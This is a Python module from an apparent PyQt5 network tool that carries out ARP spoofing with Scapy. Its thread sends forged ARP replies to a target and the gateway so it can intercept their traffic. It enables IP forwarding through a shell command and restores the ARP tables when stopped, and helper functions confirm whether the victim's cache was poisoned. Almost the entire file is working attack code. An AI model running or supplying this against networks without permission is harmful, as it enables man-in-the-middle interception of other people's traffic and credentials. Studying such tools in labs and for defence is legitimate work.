# src/core/arp_spoof.py

import os
import datetime
from PyQt5.QtCore import QThread, pyqtSignal
from scapy.all import (
    Ether, ARP, sendp, getmacbyip,
    get_if_hwaddr, conf, srp, sniff
)

LOG_PATH = os.path.join(os.path.dirname(__file__), "../../logs/arp_spoof_core_log.txt")

def log_core(message: str):
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    full_msg = f"{timestamp} {message}"
    print(full_msg)
    os.makedirs("logs", exist_ok=True)
    with open(LOG_PATH, "a") as f:
        f.write(full_msg + "\n")

class ARPSpoofThread(QThread):
    finished = pyqtSignal()

    def __init__(self, target_ip, gateway_ip, interval=2, parent=None):
        super().__init__(parent)
        self.target_ip  = target_ip
        self.gateway_ip = gateway_ip
        self.interval   = interval
        self.running    = True

    def restore_arp(self, iface, tmac, gmac, max_attempts=3):
        """
        Sends multiple ARP packets to restore tables and automatically verifies restoration.
        """
        log_core(f"Starting ARP restoration for target {self.target_ip} and gateway {self.gateway_ip}")
        for attempt in range(max_attempts):
            log_core(f"Restoration attempt {attempt+1}")
            for _ in range(7):  # More repetitions for reliability
                sendp(Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=gmac),
                      iface=iface, verbose=False)
                sendp(Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=tmac),
                      iface=iface, verbose=False)
                self.msleep(200)  # Wait between packets

            # Verify restoration
            restored, detected_mac = self.check_arp_restored(iface, tmac, gmac)
            log_core(f"Detected MAC for gateway on victim: {detected_mac}")
            if restored:
                log_core("[+] ARP restoration successful.")
                return
            else:
                log_core(f"[!] ARP restoration attempt {attempt+1} failed, retrying...")

        log_core("[!] ARP restoration failed after multiple attempts.")

    def check_arp_restored(self, iface, tmac, gmac):
        """
        Checks if the ARP tables of the target and gateway no longer point to the attacker's MAC.
        Returns (restored: bool, detected_mac: str)
        """
        arp_req = Ether(dst=tmac) / ARP(op=1, pdst=self.gateway_ip)
        ans, _ = srp(arp_req, iface=iface, timeout=2, retry=1, verbose=False)
        for _, resp in ans:
            detected_mac = resp.hwsrc.lower()
            # Less strict: accept restoration if MAC is not attacker's MAC
            if detected_mac == gmac.lower():
                return True, detected_mac
            else:
                return False, detected_mac
        return False, "No response"

    def run(self):
        iface   = conf.iface
        our_mac = get_if_hwaddr(iface)
        tmac    = getmacbyip(self.target_ip)
        gmac    = getmacbyip(self.gateway_ip)

        log_core(f"Starting ARP spoofing: target={self.target_ip} ({tmac}), gateway={self.gateway_ip} ({gmac}), attacker_mac={our_mac}")

        if os.geteuid() != 0:
            log_core("[!] Must run as root")
            raise PermissionError("Must run as root")
        if not tmac or not gmac:
            log_core("[!] Could not get MACs. Aborting.")
            return
        if os.name != 'nt':
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        pt = Ether(dst=tmac)/ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwsrc=our_mac)
        pg = Ether(dst=gmac)/ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwsrc=our_mac)

        while self.running:
            sendp(pt, iface=iface, verbose=False)
            sendp(pg, iface=iface, verbose=False)
            self.msleep(self.interval * 1000)

        self.restore_arp(iface, tmac, gmac)
        self.finished.emit()

    def stop(self):
        self.running = False

def check_arp_spoof_success(victim_ip: str, gateway_ip: str) -> bool:
    """
    Check if the victim's ARP cache associates the gateway IP with the attacker's MAC address.
    If not detected by ARP request, try sniffing ARP replies.
    """
    iface        = conf.iface
    attacker_mac = get_if_hwaddr(iface).lower()
    victim_mac = getmacbyip(victim_ip)
    if not victim_mac:
        log_core(f"[!] Could not get victim MAC for {victim_ip}")
        return False

    arp_req = Ether(dst=victim_mac) / ARP(op=1, pdst=gateway_ip)
    ans, _  = srp(arp_req, iface=iface, timeout=3, retry=2, verbose=False)

    found = False
    for _, resp in ans:
        detected_mac = resp.hwsrc.lower()
        log_core(f"Detected MAC for gateway on victim ({victim_ip}): {detected_mac}")
        if detected_mac == attacker_mac:
            found = True

    if found:
        log_core("[+] ARP spoofing detected: victim associates gateway IP with attacker's MAC.")
        return True
    else:
        log_core("[!] ARP spoofing not detected by ARP request. Trying sniffing method...")
        # Try sniffing ARP replies for more reliability
        return sniff_arp_poisoning(victim_ip, gateway_ip, attacker_mac, iface)

def sniff_arp_poisoning(target_ip, gateway_ip, attacker_mac, iface, timeout=10):
    """
    Sniffs ARP replies on the network to check if the victim associates the gateway IP with the attacker's MAC.
    Returns True if poisoning is detected.
    """
    log_core(f"Sniffing ARP replies for {timeout} seconds to validate poisoning...")

    def arp_poisoned(pkt):
        if pkt.haslayer(ARP):
            # ARP reply from victim for gateway IP, but with attacker's MAC
            if pkt[ARP].op == 2 and pkt[ARP].psrc == gateway_ip and pkt[ARP].hwsrc.lower() == attacker_mac.lower():
                log_core(f"[+] ARP poisoning detected via sniffing: {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")
                return True
        return False

    packets = sniff(iface=iface, filter="arp", timeout=timeout)
    for pkt in packets:
        if arp_poisoned(pkt):
            return True
    log_core("[!] No ARP poisoning detected via sniffing.")
    return False